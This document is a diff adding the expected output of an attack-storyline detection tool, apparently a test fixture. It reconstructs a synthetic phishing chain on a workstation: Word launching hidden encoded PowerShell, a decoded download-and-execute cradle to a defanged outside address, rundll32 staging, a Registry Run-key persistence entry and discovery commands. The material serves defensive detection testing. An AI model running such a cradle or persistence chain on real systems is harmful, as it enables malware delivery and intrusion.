@@ -1,0 +1,52 @@
+ LINEAGE   v<version> › story      Process lineage & attack storylines
+ Input       phish_chain.jsonl · sha256 db62…cedc · 11.6 KB
+ Hosts       ws-14.corp.example
+ Span        2026-10-12T10:00:00Z → 11:01:10Z (1h01m)
+ Parameters  rules all · min severity info · gap 10m · telemetry gap 30m
+
+S1 · root OUTLOOK.EXE · ws-14.corp.example · CORP\jdoe · HIGH · 4 tactics · 8 findings · 2026-10-12T10:01:00Z → 
+10:02:40Z (1m40s)
+     1  10:01:00Z    explorer.exe spawned outlook.exe "C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"
+     2  10:02:00Z    outlook.exe spawned winword.exe "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n 
+"C:\Users\jdoe…
+   ── Execution ──
+     3  10:02:05Z  ! winword.exe spawned cmd.exe cmd.exe /c powershell -nop -w hidden -enc 
+SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjA… [CMD-001, LIN-001]  T1204.002
+     4  10:02:05Z    cmd.exe decoded: IEX (New-Object 
+Net.WebClient).DownloadString('hxxp[://]203[.]0[.]113[.]10/a.ps1')
+     5  10:02:06Z  ! cmd.exe spawned powershell.exe powershell -nop -w hidden -enc 
+SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUA… [CMD-001, CMD-002]  T1059.001
+     6  10:02:06Z    powershell.exe decoded: IEX (New-Object 
+Net.WebClient).DownloadString('hxxp[://]203[.]0[.]113[.]10/a.ps1')
+     7  10:02:07Z    powershell.exe resolved dl.example
+     8  10:02:08Z  ! powershell.exe → 203.0.113.10:80/tcp (dl.example) [GR-001]  T1204.002
+     9  10:02:10Z    powershell.exe wrote C:\Users\Public\upd.exe
+    10  10:02:11Z    powershell.exe wrote C:\Users\Public\stage.dll
+    11  10:02:20Z    powershell.exe spawned rundll32.exe rundll32.exe C:\Users\Public\stage.dll,Start
+    12  10:02:30Z  ! rundll32.exe → 198.51.100.20:443/tcp (cdn.example) [GR-001, NET-001]  T1204.002
+   ── Persistence ──
+    13  10:02:40Z  ! Registry Run key set: 
+HKU\S-1-5-21-3623811015-3361044348-30300820-1013\Software\Microsoft\Windows\CurrentVersion\Run\Updater  T1547.001
+ Scope       1 user · 5 processes · 2 files (2 executable) · 1 persistence key · 2 destinations
+ Review      verify 5 processes · review 1 persistence key · review 2 files · hunt 2 destinations
+ Persistence Registry Run key set → 
+HKU\S-1-5-21-3623811015-3361044348-30300820-1013\Software\Microsoft\Windows\CurrentVersion\Run\Updater
+ Files       C:\Users\Public\upd.exe
+             C:\Users\Public\stage.dll
+ Registry    HKU\S-1-5-21-3623811015-3361044348-30300820-1013\Software\Microsoft\Windows\CurrentVersion\Run\Updater
+ Destination 203.0.113.10:80/tcp
+             198.51.100.20:443/tcp
+ DNS         dl[.]example
+             cdn[.]example
+
+S2 · root upd.exe · ws-14.corp.example · NT AUTHORITY\SYSTEM · MEDIUM · 2 tactics · 3 findings · 2026-10-12T11:00:00Z →
+11:01:10Z (1m10s)
+   ── Execution ──
+     1  11:00:00Z  ! services.exe spawned upd.exe C:\Users\Public\upd.exe [GR-003, LOC-001]  T1105
+   ── Discovery ──
+     2  11:00:10Z  ! upd.exe spawned whoami.exe whoami /all [GR-002]  T1033
+     3  11:00:40Z  ! upd.exe spawned ipconfig.exe ipconfig /all [GR-002]  T1033
+     4  11:01:10Z  ! upd.exe spawned systeminfo.exe systeminfo [GR-002]  T1033
+ Scope       1 user · 4 processes · 0 files (0 executable) · 0 persistence keys · 0 destinations
+ Review      verify 4 processes · review 0 persistence keys · review 0 files · hunt 0 destinations
+ Result   FINDINGS DETECTED · 2 storylines · 11 findings · exit 1
